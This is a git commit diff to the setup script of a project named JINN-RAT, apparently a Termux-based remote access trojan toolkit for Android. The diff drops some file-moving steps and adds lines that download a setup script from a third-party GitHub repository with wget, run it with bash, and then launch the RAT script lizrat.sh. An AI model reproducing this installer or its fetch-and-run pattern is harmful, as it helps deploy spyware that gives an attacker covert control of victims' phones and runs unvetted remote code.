e9cccad068ac9aa48d14f69f4817347d785137a9
•JINN• <95747858+alvinbaby@users.noreply.github.com>
2022-06-23 08:31:30 +0530

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,9 +1,12 @@
 #!data/data/com.termux/files/usr/bin/bash
-cp -rf JINN-RAT $HOME
-mv $HOME/JINN-RAT/server/file/maindb.json $HOME/JINN-RAT/server
-mv $HOME/JINN-RAT/server/file/lizrat.sh $HOME
-rm -rf $HOME/JINN-RAT/server/file
+
 cd $HOME
 mkdir lizrat
+cd $HOME
+wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh
+bash setup.sh
+clear |✅✅✅
+
+cd JINN-RAT
 chmod +x lizrat.sh
 bash lizrat.sh
